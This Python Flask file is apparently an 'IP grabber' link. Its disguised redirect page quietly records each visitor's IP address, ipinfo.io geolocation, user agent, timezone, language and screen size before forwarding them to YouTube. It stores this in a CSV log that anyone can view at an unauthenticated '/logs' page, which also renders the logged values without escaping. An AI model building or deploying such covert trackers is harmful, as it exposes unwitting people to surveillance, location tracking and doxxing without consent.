
from flask import Flask, request, render_template_string
from datetime import datetime
import csv
import os
import requests

app = Flask(__name__)

TARGET_URL = "https://www.youtube.com"
LOG_FILE = "log.csv"

if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Timestamp", "IP", "City", "Region", "Country", "User-Agent", "Timezone", "Language", "Screen Resolution"])

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Redirecting...</title></head>
<body>
<p>Redirecting, please wait...</p>
<script>
  function sendData() {
    fetch("/log_additional", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        screen: screen.width + "x" + screen.height
      })
    }).then(() => {
      window.location.href = '{{ target_url }}';
    }).catch(() => {
      window.location.href = '{{ target_url }}';
    });
  }

  window.onload = sendData;
</script>
</body>
</html>
"""

last_visit = {}

def get_geo(ip):
    try:
        res = requests.get(f"https://ipinfo.io/{ip}/json")
        if res.status_code == 200:
            data = res.json()
            return data.get("city", "Unknown"), data.get("region", "Unknown"), data.get("country", "Unknown")
    except:
        pass
    return "Unknown", "Unknown", "Unknown"

@app.route("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "Unknown")
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    city, region, country = get_geo(ip)

    last_visit[ip] = {
        "Timestamp": timestamp,
        "IP": ip,
        "City": city,
        "Region": region,
        "Country": country,
        "User-Agent": ua
    }

    return render_template_string(HTML_TEMPLATE, target_url=TARGET_URL)

@app.route("/log_additional", methods=["POST"])
def log_additional():
    data = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    base_data = last_visit.get(ip)

    if base_data:
        row = [
            base_data["Timestamp"],
            base_data["IP"],
            base_data["City"],
            base_data["Region"],
            base_data["Country"],
            base_data["User-Agent"],
            data.get("timezone", "Unknown"),
            data.get("language", "Unknown"),
            data.get("screen", "Unknown")
        ]
        with open(LOG_FILE, "a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(row)
    return ("", 204)

@app.route("/logs")
def logs():
    if not os.path.exists(LOG_FILE):
        return "<p>No data collected yet.</p>"

    with open(LOG_FILE, "r", encoding="utf-8") as f:
        lines = f.readlines()

    rows = [line.strip().split(",") for line in lines]
    header_html = "".join(f"<th>{h}</th>" for h in rows[0])
    body_html = "".join(
        "<tr>{}</tr>".format("".join(f"<td>{cell}</td>" for cell in row)) for row in rows[1:]
    )
    return f"<table border='1'><tr>{header_html}</tr>{body_html}</table>"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
